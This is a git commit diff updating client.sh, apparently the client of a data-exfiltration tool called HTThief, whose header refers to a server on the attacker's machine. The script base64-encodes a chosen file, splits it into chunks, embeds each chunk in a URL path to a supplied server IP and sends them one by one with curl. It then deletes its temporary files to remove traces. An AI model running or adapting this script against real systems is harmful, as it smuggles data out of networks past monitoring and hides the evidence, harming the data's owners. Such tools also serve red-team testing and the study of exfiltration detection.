898c50a9d9775b78f5ed2294b120c379eae5da60
Ewerson Guimaraes (Crash) <crash@dclabs.com.br>
2023-08-11 16:11:47 +0200

    Update client.sh

--- client.sh
+++ client.sh
@@ -22,44 +22,57 @@ That's the client script. Don't forget to run the server script on you attacker 
 
 EOF
 
+# Check if the --ip parameter is provided
+if [ "$1" != "--ip" ]; then
+    echo "Usage: $0 --ip <HTThief_Server_IP>"
+    exit 1
+fi
 
-### path to file to be sent
-echo "Path to file to be sent"
+# Cleaning residual files
+rm -f /tmp/ax0*
+
+# Get the URL parameter value
+url_parameter="$2"
+
+# Path to file to be sent
+echo "Path to file to be sent:"
 read path
 
 echo " "
 
-### encoding the file
-echo "Enconding the file..."
-ENCODED=$(base64 $path)
-echo $ENCODED > /tmp/ax0c.txt
+# Encode the file
+echo "Encoding the file..."
+ENCODED=$(base64 "$path")
+echo "$ENCODED" > /tmp/ax0c.txt
 
 echo " "
 
-### organizing the file
-echo "Organizating the file..."
+# Organize the file
+echo "Organizing the file..."
 tr -s '[:space:]' '\n' < /tmp/ax0c.txt > /tmp/ax0d.txt
 FILE="/tmp/ax0d.txt"
 
 echo " "
 echo "Doing the magic ;)"
-### doing same magic... preparing file to be sent...
-for i in $(cat $FILE); do
-        # Change to your domain
-        echo "http://localhost/$i" >> /tmp/ax0a.txt
-done
 
+# Prepare the file to be sent
+for i in $(cat "$FILE"); do
+    echo "http://$url_parameter/$i" >> /tmp/ax0a.txt
+done
 
 echo "Send the file..."
 echo " "
-### sed the file!
+
+# Process the URLs
 FILE2="/tmp/ax0a.txt"
-echo $FILE2
+echo "$FILE2"
 
-for j in $(cat $FILE2); do
-        curl $j
-done
-
+while read -r j; do
+    curl "$j"
+done < "$FILE2"
 
 echo " "
+# Cleaning residual files - just in case
+rm -f /tmp/ax0*
+
 echo "Done!"
